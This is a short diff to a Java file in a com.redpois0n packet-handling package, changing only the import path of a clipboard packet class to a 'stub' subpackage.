@@ -1,7 +1,7 @@
 package com.redpois0n.packets.incoming;
 
 import com.redpois0n.Connection;
-import com.redpois0n.packets.outgoing.Packet41Clipboard;
+import com.redpois0n.stub.packets.outgoing.Packet41Clipboard;
 
 
 public class PacketCBOARD extends AbstractIncomingPacket {
